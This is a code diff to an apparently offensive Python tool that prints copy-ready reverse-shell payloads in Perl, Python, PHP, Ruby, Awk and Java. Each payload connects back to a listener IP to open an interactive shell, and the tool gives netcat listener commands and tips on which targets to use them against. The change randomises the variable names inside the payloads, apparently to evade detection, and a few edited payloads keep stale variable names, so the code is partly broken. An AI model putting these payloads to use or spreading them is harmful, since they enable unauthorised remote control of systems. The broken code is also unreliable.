@@ -907,7 +907,9 @@ def Shells():
     elif options == "2":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Linux SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -e \'use Socket;$i=\"' + listener_ip + '\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n' % rp2) 
+        pN = randomString(8)
+        iN = randomString(10)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -e \'use Socket;$%s=\"' % iN + listener_ip + '\";$%s=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($%s,inet_aton($%s)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n' %(pN, rp2, pN, iN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Linux Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp2))
         print("\t NOTE:\t  This  works fine. However, I would use python if that is avalible to you\n")
@@ -915,7 +917,8 @@ def Shells():
     elif options == "3":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Windows SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,\"' + listener_ip + ':{0}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'\n'.format(rp3))
+        cN = randomString(9)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -MIO -e \'${0}=new IO::Socket::INET(PeerAddr,\"'.format(cN) + listener_ip + ':{0}\");STDIN->fdopen(${1},r);$~->fdopen($c,w);system$_ while<>;\'\n'.format(rp3, cN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Windows Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp3))
         print("\t NOTE:\t  I would only use this on older boxes that do not have any other execution paths\n")
@@ -939,8 +942,9 @@ def Shells():
         print("\t*******************************************************************\n")
     elif options == "5":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Linux Reverse  SHELL\t\t***\n" + bcolors.ENDC)
-        print("\t*******************************************************************\n") 
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'" %(listener_ip, rp5))
+        print("\t*******************************************************************\n")
+        sN = randomString(8)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "python -c \'import socket,subprocess,os;{2}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);{2}.connect((\"{0}\",{1}));os.dup2({2}.fileno(),0); os.dup2({2}.fileno(),1);os.dup2({2}.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format(listener_ip, rp5, sN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp5))
         print("\t NOTE:\t  This is a go to shell if python is avalible\n")
@@ -956,7 +960,9 @@ def Shells():
     elif options == "7":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "php -r \'$sock=fsockopen(\"" + listener_ip +  "\",{0});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'\n".format(rp7))
+        sockN = randomString(10)
+        procN = randomString(9)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "php -r \'${0}=fsockopen(\"".format(sockN) + listener_ip +  "\",{0});${2}=proc_open(\"/bin/sh -i\", array(0=>${1}, 1=>${1}, 2=>${1}),$pipes);\'\n".format(rp7, sockN, procN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp7))
         print("\t NOTE:\t This shell should be used if there is LFI or a place within a PHP application where you can create a file within the web root.\n")
@@ -964,7 +970,8 @@ def Shells():
     elif options == "8":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Linux SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e\'f=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'\n".format(listener_ip, rp8))
+        fN = randomString(12)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e\'{2}=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",{2},{2},{2})\'\n".format(listener_ip, rp8, fN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Linux Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp8))
         print("\t NOTE:\t This shell works fine. However, python is normally a better choice.\n")
@@ -972,7 +979,8 @@ def Shells():
     elif options == "9":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Windows SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'c=TCPSocket.new(\"" + listener_ip  + "\",\"%s\");while(cmd=c.gets);Open3.popen(cmd,\"r\"){|io|c.print io.read}end\'\n" % rp9)
+        cN = randomString(8)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'%s=TCPSocket.new(\"" % cN + listener_ip  + "\",\"%s\");while(cmd=%s.gets);Open3.popen(cmd,\"r\"){|io|%s.print io.read}end\'\n" %(rp9, cN, cN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Windows Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp9))
         print("\t NOTE:\t This shell whould require ruby to be installed on the Windows box.\n")
@@ -987,7 +995,7 @@ def Shells():
         print("\t*******************************************************************\n")
     elif options == "11":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tAwk Reverse  SHELL\t\t***\n" + bcolors.ENDC)
-        print("\t*******************************************************************\n") 
+        print("\t*******************************************************************\n")
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "awk \'BEGIN {s = \"/inet/tcp/0/" + listener_ip + "/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null\n" % rp11)
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tAwk Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp11))
@@ -996,24 +1004,35 @@ def Shells():
     elif options == "12":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
+        rN = randomString(10)
+        pN = randomString(8)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-""" %(listener_ip, rp12))
+{2} = Runtime.getRuntime()
+{3} = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+{3}.waitFor()
+""".format(listener_ip, rp12, rN, pN))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp12))
         print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Linux. Things like Jinkens, etc..\n")
         print("\t*******************************************************************\n")
     elif options == "13":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Windows Reverse  SHELL\t\t***\n" + bcolors.ENDC)
-        print("\t*******************************************************************\n") 
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
+        print("\t*******************************************************************\n")
+        pN = randomString()
+        sN = randomString()
+        piN = randomString()
+        peN = randomString()
+        siN = randomString()
+        poN = randomString()
+        soN = randomString()
+        payl = """
 String host="%s";
 int port=%s;
 String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-""" %(listener_ip, rp13))
+""" %(listener_ip, rp13)
+        payl += "Process " + pN + "=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket " + sN + "=new Socket(host,port);InputStream " + piN + "=" + pN + ".getInputStream()," + peN + "=" + pN + ".getErrorStream(), " + siN + "=" + sN + ".getInputStream();OutputStream " + poN + "=" + pN + ".getOutputStream()," + soN + "=" + sN + ".getOutputStream();while(!" + sN + ".isClosed()){while(" + piN + ".available()>0)" + soN + ".write(" + piN + ".read());while(" + peN + ".available()>0)" + soN + ".write(" + peN + ".read());while(" + siN + ".available()>0)" + poN + ".write(" + siN + ".read());" + soN + ".flush();" + poN + ".flush();Thread.sleep(50);try {" + pN + ".exitValue();break;}catch (Exception e){}};" + pN + ".destroy();" + sN + ".close();"
+
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + payl)
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Windows Listener\t\t***\n" + bcolors.ENDC)
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp13))
         print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Windows. Things like Jinkens, etc..\n")
